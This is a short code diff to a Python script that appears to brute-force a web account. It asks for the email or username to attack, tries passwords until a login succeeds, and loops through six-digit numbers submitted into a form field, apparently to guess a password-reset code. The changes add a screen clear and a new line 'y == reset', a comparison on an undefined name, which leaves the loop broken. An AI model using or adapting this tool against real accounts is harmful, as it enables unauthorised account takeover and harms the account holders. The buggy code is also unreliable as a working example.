@@ -4,7 +4,7 @@ from time import sleep
 from bs4 import BeautifulSoup
 import requests
 import mechanize
-
+import os
 CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
 MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
@@ -44,7 +44,7 @@ def try_password(self, email, password):
     if self.is_logged_in(data):
         print ('Password found: %s' % password )
         sys.exit()
-
+os.system('clear')
 soup = BeautifulSoup()
 email = input('Email address or username to attack:')
 """password = input('Password:')"""
@@ -76,7 +76,8 @@ browser.submit()
 reset = 999999
 while reset > 99999:
   browser.select_form(nr=0)
-  browser.form['n'] = str(reset)
+  y == reset
+  browser.form['n'] = str(y)
   browser.submit()
   url = browser.geturl()
   print(str(reset))
